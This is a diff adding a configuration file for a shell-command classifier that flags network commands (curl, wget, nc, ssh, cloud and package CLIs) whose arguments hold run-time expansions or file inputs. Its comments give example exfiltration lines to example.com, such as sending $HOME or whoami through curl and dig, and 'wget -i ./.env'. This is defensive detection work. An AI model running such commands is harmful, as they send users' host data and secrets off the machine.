@@ -1,0 +1,156 @@
+# Commands that reach another host.
+#
+# An argument the shell fills in at run time — `$VAR`, `${VAR}`, `$(cmd)`, a backtick, `$((…))`,
+# `<(cmd)`, an xargs item, a `find -exec`/`fd -x` placeholder — carries a value nobody can read in
+# the command line. Handed to a command that reaches another host, that value leaves the machine:
+# `curl "https://example.com/?q=$HOME"`, `dig "$(whoami).example.com"`, `ls | xargs -I{} ping -c1 {}.example.com`.
+# Such an invocation is classified as sending host data to an unnamed destination, which no level
+# below `yolo` admits. The same command with literal arguments is unaffected.
+#
+# Matching is by command name (aliases canonicalized) and, under [subcommands], by any later word
+# equal to a listed one. Over-matching costs a prompt only when an expansion is present; missing a
+# command costs a silent transfer, so an entry is added on doubt.
+#
+# `src/cst/netargs.rs` reads this file. Its guard test walks the command directories that are
+# entirely about other hosts (net, api, cloud, forges, pm, serverless, kafka, db) and fails on any
+# command that is in neither `commands`, [subcommands] nor `local`.
+
+commands = [
+  # HTTP and file transfer
+  "curl", "wget", "http", "https", "xh", "xhs", "aria2c", "yt-dlp", "monolith", "httpyac", "hurl", "grpcurl", "ipfs",
+  "rclone", "rsync", "scp", "sftp", "sshfs", "ftp", "tftp", "lftp", "smbutil", "mc", "restic", "borg",
+  # remote shells and tunnels
+  "ssh", "mosh", "autossh", "ssh-copy-id", "ssh-keyscan", "telnet", "socat", "nc", "ncat", "netcat",
+  "ngrok", "cloudflared", "tailscale",
+  # name lookups and probes
+  "dig", "host", "nslookup", "delv", "doggo", "unbound-host", "dns-sd", "dscacheutil", "whois", "ip2cc",
+  "ping", "ping6", "fping", "arping", "traceroute", "traceroute6", "tracepath", "mtr", "nmap", "masscan", "sntp",
+  "ippfind", "ipptool", "ldapcompare", "ldapsearch", "ldapurl", "ldapwhoami",
+  "snmpbulkget", "snmpbulkwalk", "snmpdelta", "snmpdf", "snmpget", "snmpgetnext", "snmpnetstat", "snmpstatus",
+  "snmptable", "snmptest", "snmptranslate", "snmpwalk",
+  # opens a URL in a browser
+  "open", "xdg-open",
+  # load generators and API runners
+  "ab", "artillery", "bombardier", "bru", "inso", "iperf3", "k6", "locust", "newman", "siege", "vegeta", "wrk", "oha",
+  # cloud, platform and service CLIs
+  "aws", "az", "doctl", "exo", "gcloud", "gsutil", "bq", "hcloud", "linode-cli", "oci", "scw", "stapler", "vultr-cli",
+  "amplify", "cdk", "chalice", "copilot", "eb", "sam", "sls",
+  "heroku", "vercel", "netlify", "flyctl", "fly", "railway", "render", "koyeb", "northflank", "scalingo", "clever", "cf",
+  "firebase", "supabase", "wrangler", "pscale", "pulumi", "newrelic", "sentry-cli", "grafana-cli", "otel-cli", "amtool",
+  "huggingface-cli", "hf", "wandb", "kamal", "certbot", "twine", "snyk", "safety",
+  "kubectl", "oc", "stern", "flux", "linkerd", "istioctl", "velero", "kn", "argocd", "consul", "nomad", "vault",
+  "skopeo", "crane", "oras", "cosign",
+  "op", "bw", "dcli", "hey", "bitcoin-cli", "lncli", "kinit", "kgetcred",
+  "basecamp", "tea", "jjpr", "jira", "linear", "notion", "todoist", "trello",
+  "kafka-console-consumer", "kafka-consumer-groups", "kafka-topics",
+  "nix-prefetch-url", "nix-channel", "ansible-playbook", "sdkmanager", "mas", "softwareupdate", "tldr", "speedtest",
+  "curlie", "httpstat", "websocat", "wscat", "gping", "trip", "dog", "q", "kdig", "drill", "ntpdate", "rdate",
+  # model APIs
+  "llm", "aider", "claude", "codex", "opencode", "vibe", "agy",
+  # scaffolders that fetch a template
+  "cookiecutter", "degit", "create-next-app", "create-react-app", "create-vite",
+  # renderers that fetch what a page links to
+  "wkhtmltopdf", "weasyprint",
+  # database clients and tools that connect to a server
+  "psql", "pg_dump", "pg_isready", "pg_dumpall", "pg_restore", "pg_basebackup", "pg_receivewal", "pg_recvlogical",
+  "pg_rewind", "pg_amcheck", "pgbench", "pgcli", "oid2name", "clusterdb", "createdb", "createuser", "dropdb", "dropuser",
+  "reindexdb", "vacuumdb", "cockroach", "cqlsh", "nodetool", "influx", "influxd", "iredis", "redis-cli", "redis-benchmark",
+  "redis-server", "mongosh", "mongodump", "mongoexport", "mongoimport", "mongorestore", "mongostat", "mongotop",
+  "mysql", "mysqladmin", "mysqlcheck", "mysqldump", "mycli", "usql", "duckdb", "bsqldb", "bsqlodbc", "defncopy", "tsql",
+  "osql",
+]
+
+# Commands in those directories that never reach another host: they read local state, check a
+# config file, or work on a local data directory.
+local = [
+  "arp", "ifconfig", "ipconfig", "ipcalc", "netstat", "ss", "mdfind", "protoc", "pcp-htop", "wg",
+  "ssh-add", "ssh-agent", "ssh-keygen", "tcpdump", "tshark",
+  "caddy", "envoy", "haproxy", "nginx", "traefik",
+  "sqlite3", "litecli", "gdbm_dump", "gdbm_load", "gdbmtool", "ecpg", "initdb", "odbc_config", "odbcinst",
+  "pg_archivecleanup", "pg_checksums", "pg_combinebackup", "pg_config", "pg_controldata", "pg_ctl", "pg_test_fsync",
+  "pg_test_timing", "pg_upgrade", "pg_verifybackup", "pg_waldump", "pg_walsummary",
+]
+
+# Flags that make a network command read its targets or its payload from a FILE. The file's
+# content then leaves the machine with no expansion in sight: `wget -i ./.env` requests every line
+# as a URL. Spellings: `-f FILE`, `-fFILE`, `--flag=FILE`, and a short flag bundled with others
+# (`wget -qi urls.txt`).
+[file_inputs]
+wget = ["-i", "--input-file", "--config", "-e", "--execute"]
+curl = ["-K", "--config"]
+aria2c = ["-i", "--input-file", "--conf-path"]
+yt-dlp = ["-a", "--batch-file", "--config-locations", "--cookies", "--load-info-json"]
+dig = ["-f"]
+nmap = ["-iL", "--excludefile"]
+masscan = ["-iL", "--includefile", "-c", "--conf"]
+fping = ["-f", "--file"]
+ssh-keyscan = ["-f"]
+siege = ["-f", "--file"]
+ab = ["-p", "-u"]
+bombardier = ["-f", "--body-file"]
+iperf3 = ["-F", "--file"]
+vegeta = ["-targets", "--targets", "-body", "--body"]
+
+# Commands that reach another host only in some subcommands. Any word after the command name equal
+# to a listed one marks the invocation.
+[subcommands]
+git = ["fetch", "pull", "push", "clone", "ls-remote", "remote", "submodule", "--remote", "request-pull", "send-email", "svn", "p4"]
+git-lfs = ["fetch", "pull", "push", "clone", "env", "locks", "lock", "unlock"]
+jj = ["fetch", "clone", "push"]
+hg = ["pull", "push", "clone", "incoming", "outgoing", "in", "out", "identify", "id"]
+fossil = ["pull", "push", "sync", "clone"]
+gh = ["api"]
+glab = ["api"]
+npm = ["view", "v", "info", "show", "search", "s", "find", "ping", "audit", "outdated", "install", "i", "ci", "add",
+  "update", "up", "doctor", "dist-tag", "owner", "access", "team", "org", "whoami", "token", "deprecate", "star",
+  "stars", "fund", "repo", "docs", "bugs", "home", "publish", "unpublish", "exec", "x", "init", "create"]
+pnpm = ["view", "info", "show", "search", "audit", "outdated", "install", "i", "add", "update", "up", "dlx", "publish",
+  "fetch", "create", "exec"]
+yarn = ["info", "npm", "search", "audit", "outdated", "install", "add", "up", "upgrade", "upgrade-interactive", "dlx",
+  "publish", "create"]
+bun = ["info", "pm", "outdated", "install", "i", "add", "update", "x", "create", "publish", "audit"]
+cargo = ["search", "info", "install", "fetch", "update", "add", "publish", "owner", "yank", "login", "generate-lockfile",
+  "vendor"]
+pip = ["download", "install", "index", "search", "wheel"]
+pip3 = ["download", "install", "index", "search", "wheel"]
+uv = ["add", "lock", "sync", "tool", "publish", "install", "download", "index", "pip"]
+pipx = ["install", "run", "upgrade", "upgrade-all", "inject"]
+poetry = ["add", "install", "lock", "update", "search", "publish"]
+pdm = ["add", "install", "lock", "update", "search", "publish", "sync"]
+brew = ["install", "reinstall", "info", "abv", "search", "fetch", "update", "upgrade", "tap", "livecheck", "home",
+  "homepage", "audit", "bump", "bump-formula-pr", "bump-cask-pr", "create", "gist-logs"]
+go = ["get", "install", "download", "mod"]
+gem = ["install", "search", "fetch", "query", "sources", "push", "owner", "yank", "specification", "list", "info",
+  "outdated", "update"]
+bundle = ["install", "update", "outdated", "add", "lock", "info"]
+docker = ["pull", "push", "login", "search", "manifest", "run", "create", "build", "buildx"]
+podman = ["pull", "push", "login", "search", "manifest", "run", "create", "build"]
+nerdctl = ["pull", "push", "login", "run", "create", "build"]
+dotnet = ["restore", "add", "nuget", "tool", "workload", "new"]
+nuget = ["install", "restore", "list", "search", "push", "update", "delete"]
+swift = ["resolve", "update"]
+pod = ["install", "update", "search", "repo", "trunk", "spec", "outdated"]
+mise = ["install", "ls-remote", "latest", "outdated", "upgrade", "plugin", "plugins", "use", "search", "self-update"]
+asdf = ["install", "list-all", "latest", "plugin", "update"]
+rbenv = ["install"]
+pyenv = ["install"]
+nodenv = ["install"]
+plenv = ["install"]
+nvm = ["install", "ls-remote"]
+fnm = ["install", "ls-remote", "list-remote"]
+volta = ["install", "fetch", "pin"]
+rvm = ["install", "get", "fetch"]
+sdk = ["install", "list", "ls", "update", "upgrade", "outdated", "selfupdate"]
+ollama = ["pull", "push"]
+gpg = ["--recv-keys", "--recv-key", "--receive-keys", "--search-keys", "--search", "--send-keys", "--refresh-keys",
+  "--fetch-keys", "--locate-keys", "--locate-external-keys", "--auto-key-locate", "--auto-key-retrieve", "--keyserver"]
+openssl = ["s_client", "s_time", "ocsp"]
+terraform = ["init", "plan", "apply", "refresh", "get", "import", "login", "output", "providers", "state", "destroy"]
+tofu = ["init", "plan", "apply", "refresh", "get", "import", "login", "output", "providers", "state", "destroy"]
+terragrunt = ["init", "plan", "apply", "refresh", "output", "run-all", "run"]
+packer = ["init", "build"]
+helm = ["install", "upgrade", "pull", "push", "repo", "search", "dependency", "dep", "registry", "status", "list", "ls",
+  "get", "history", "show"]
+nix = ["flake", "profile", "search", "run", "shell", "build", "eval", "copy", "registry", "develop"]
+ansible-galaxy = ["install", "search", "info", "import", "role", "collection"]
+fastlane = ["pilot", "deliver", "match", "supply", "sigh", "cert", "pem", "download_dsyms", "upload_to_testflight"]
